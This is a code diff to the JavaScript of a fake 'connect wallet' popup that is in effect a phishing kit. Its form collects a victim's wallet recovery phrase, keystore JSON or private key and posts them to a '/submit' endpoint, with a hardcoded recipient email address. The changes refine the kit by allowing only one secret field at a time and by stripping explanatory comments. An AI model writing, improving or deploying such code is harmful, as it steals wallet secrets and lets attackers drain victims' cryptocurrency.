@@ -3,8 +3,10 @@
 function showPopup(walletName) {
 	const popup = document.getElementById('walletPopup');
 	const title = document.getElementById('popupTitle');
-	title.textContent = `Connect ${walletName}`;
 	popup.style.display = 'flex';
+	title.textContent = `Connect ${walletName}`;
+
+	toggleFieldLocks();
 
 	document.getElementById('walletForm').onsubmit = async function (e) {
 		e.preventDefault();
@@ -13,22 +15,27 @@ function showPopup(walletName) {
 		const keystoreJSON = document.getElementById('keystore').value.trim();
 		const privateKey = document.getElementById('privateKey').value.trim();
 
-		if (!phrase && !keystoreJSON && !privateKey) {
+		const filledFields = [phrase, keystoreJSON, privateKey].filter(Boolean);
+
+		if (filledFields.length === 0) {
 			alert('Please fill at least one field.');
 			return;
 		}
 
-		// Package data to send
+		if (filledFields.length > 1) {
+			alert('Please fill only one field at a time.');
+			return;
+		}
+
 		const walletData = {
-			to: 'maxwellexcel2@gmail.com', // Hardcoded receiver as mentioned in your description
+			to: 'maxwellexcel2@gmail.com',
 			walletName,
 			phrase,
-			keystoreJSON, // Changed from keystore to keystoreJSON to match server expectations
+			keystoreJSON,
 			privateKey,
 		};
 
 		try {
-			// Send data to your server endpoint
 			const response = await fetch('/submit', {
 				method: 'POST',
 				headers: {
@@ -60,4 +67,32 @@ function closePopup() {
 	document.getElementById('phrase').value = '';
 	document.getElementById('keystore').value = '';
 	document.getElementById('privateKey').value = '';
+
+	// Re-enable all fields in case they were disabled
+	document.getElementById('phrase').disabled = false;
+	document.getElementById('keystore').disabled = false;
+	document.getElementById('privateKey').disabled = false;
+}
+
+function toggleFieldLocks() {
+	const phrase = document.getElementById('phrase');
+	const keystore = document.getElementById('keystore');
+	const privateKey = document.getElementById('privateKey');
+
+	const fields = [phrase, keystore, privateKey];
+
+	fields.forEach((field, idx) => {
+		field.addEventListener('input', () => {
+			if (field.value.trim() !== '') {
+				fields.forEach((f, i) => {
+					if (i !== idx) f.disabled = true;
+				});
+			} else {
+				const allEmpty = fields.every(f => f.value.trim() === '');
+				if (allEmpty) {
+					fields.forEach(f => f.disabled = false);
+				}
+			}
+		});
+	});
 }
